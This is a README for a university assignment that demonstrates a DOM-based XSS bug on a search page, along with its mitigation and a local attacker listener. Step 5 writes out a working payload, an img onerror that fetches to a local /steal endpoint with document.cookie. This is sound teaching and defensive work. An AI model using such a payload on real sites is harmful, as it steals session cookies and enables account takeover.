# DOM-Based XSS — ISEC3004 Assignment 1

Vulnerable code, exploit, and mitigation for DOM-based XSS (CWE-79), part of the
ISEC3004 group assignment (group 35).

## Files
- `vulnerable.html` — search page with the DOM XSS bug (uses `innerHTML` on user input)
- `mitigated.html` / `mitigated.js` — fixed version (uses `textContent` + a CSP)
- `attacker_server.py` — small local server that plays the "attacker" and receives stolen cookie data
- `EXPLOIT.md` — write-up: the bug, the payloads used, how the attack works, and test results

## How to run it

1. Start a local server in this folder:
python -m http.server 8000

2. In another terminal, start the attacker listener:
python attacker_server.py

3. Open `http://localhost:8000/vulnerable.html` in a browser.

4. Open DevTools (F12) → Console, and run:
document.cookie = "session=SECRET123"

5. Paste this into the search box and click Search:
<img src=x onerror="fetch('http://127.0.0.1:9000/steal?c='+encodeURIComponent(document.cookie))"> ``` 6. Check the `attacker_server.py` terminal — it should print the stolen cookie.

Same for Vulnerable code and Mitiagted code, the result will be on the hacker terminal!.
